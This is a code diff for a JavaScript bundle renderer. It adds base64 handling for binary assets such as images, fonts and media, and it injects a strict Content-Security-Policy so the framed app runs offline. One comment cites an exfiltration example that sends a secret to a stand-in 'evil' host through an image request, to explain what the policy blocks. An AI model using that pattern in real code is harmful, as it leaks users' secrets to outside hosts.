@@ -10,6 +10,25 @@
     html: "text/html",
     txt: "text/plain",
     xml: "application/xml",
+    // Binary asset types (carried as base64 in the bundle).
+    png: "image/png",
+    jpg: "image/jpeg",
+    jpeg: "image/jpeg",
+    gif: "image/gif",
+    webp: "image/webp",
+    ico: "image/x-icon",
+    bmp: "image/bmp",
+    woff: "font/woff",
+    woff2: "font/woff2",
+    ttf: "font/ttf",
+    otf: "font/otf",
+    eot: "application/vnd.ms-fontobject",
+    mp3: "audio/mpeg",
+    wav: "audio/wav",
+    mp4: "video/mp4",
+    webm: "video/webm",
+    wasm: "application/wasm",
+    pdf: "application/pdf",
   };
 
   function normalizeKey(path) {
@@ -21,15 +40,18 @@
 
   // buildFileMap indexes files by both their full relative path and basename so
   // references like "css/app.css", "./css/app.css" and "app.css" all resolve.
+  // Each value is an entry { content, encoding }; encoding is "base64" for binary
+  // assets and "" (falsy) for UTF-8 text — a missing encoding means text, which
+  // keeps bundles produced before base64 support rendering unchanged.
   function buildFileMap(files) {
     var map = {};
     files.forEach(function (f) {
       var name = f.title || "";
-      var content = f.content || "";
-      map[normalizeKey(name)] = content;
+      var entry = { content: f.content || "", encoding: f.encoding || "" };
+      map[normalizeKey(name)] = entry;
       var base = name.split("/").pop();
       if (base && !(normalizeKey(base) in map)) {
-        map[normalizeKey(base)] = content;
+        map[normalizeKey(base)] = entry;
       }
     });
     return map;
@@ -50,16 +72,22 @@
   }
 
   function findEntry(map, files) {
-    if ("index.html" in map) return map["index.html"];
+    if ("index.html" in map) return map["index.html"].content;
     for (var i = 0; i < files.length; i++) {
       if (ext(files[i].title) === "html") return files[i].content || "";
     }
     return null;
   }
 
-  function toDataURI(content, name) {
-    var mime = MIME[ext(name)] || "text/plain";
-    return "data:" + mime + ";charset=utf-8," + encodeURIComponent(content);
+  // toDataURI turns a bundle entry into a data: URI. Base64 entries (binary
+  // assets) are emitted verbatim as base64; text entries are percent-encoded.
+  function toDataURI(entry, name) {
+    var isBase64 = entry && entry.encoding === "base64";
+    var mime = MIME[ext(name)] || (isBase64 ? "application/octet-stream" : "text/plain");
+    if (isBase64) {
+      return "data:" + mime + ";base64," + entry.content;
+    }
+    return "data:" + mime + ";charset=utf-8," + encodeURIComponent(entry.content);
   }
 
   // inlineCSSUrls rewrites url(...) references inside a stylesheet to data URIs
@@ -81,12 +109,33 @@
 
     var doc = new DOMParser().parseFromString(entry, "text/html");
 
+    // Lock the framed app to an offline, self-contained execution model. Because
+    // every asset is inlined to a data: URI (see below), the app needs no network
+    // at all. connect-src 'none' blocks fetch/XHR/WebSocket/sendBeacon, and
+    // restricting img/font/media/style/script to inline+data: closes the remaining
+    // exfiltration vectors (e.g. new Image().src = '//evil/?' + secret). This runs
+    // on top of the opaque-origin iframe sandbox for defense in depth.
+    var csp = doc.createElement("meta");
+    csp.setAttribute("http-equiv", "Content-Security-Policy");
+    csp.setAttribute(
+      "content",
+      "default-src 'none'; script-src 'unsafe-inline'; style-src 'unsafe-inline'; " +
+        "img-src data: blob:; font-src data:; media-src data: blob:; " +
+        "connect-src 'none'; form-action 'none'; base-uri 'none'"
+    );
+    var head = doc.head || doc.getElementsByTagName("head")[0];
+    if (head) {
+      head.insertBefore(csp, head.firstChild);
+    } else {
+      doc.documentElement.insertBefore(csp, doc.documentElement.firstChild);
+    }
+
     var links = doc.querySelectorAll('link[rel~="stylesheet"][href]');
     Array.prototype.forEach.call(links, function (link) {
       var css = lookup(map, link.getAttribute("href"));
       if (css == null) return;
       var style = doc.createElement("style");
-      style.textContent = inlineCSSUrls(css, map);
+      style.textContent = inlineCSSUrls(css.content, map);
       link.parentNode.replaceChild(style, link);
     });
 
@@ -102,7 +151,7 @@
       var inline = doc.createElement("script");
       var type = script.getAttribute("type");
       if (type) inline.setAttribute("type", type);
-      inline.textContent = js;
+      inline.textContent = js.content;
       script.parentNode.replaceChild(inline, script);
     });
 
@@ -256,7 +305,7 @@
         title: data.title || "webapp",
         multi: false,
         sources: files.map(function (f) {
-          return { name: f.title, content: f.content };
+          return { name: f.title, content: f.content, encoding: f.encoding };
         }),
       };
       if (result.error) {
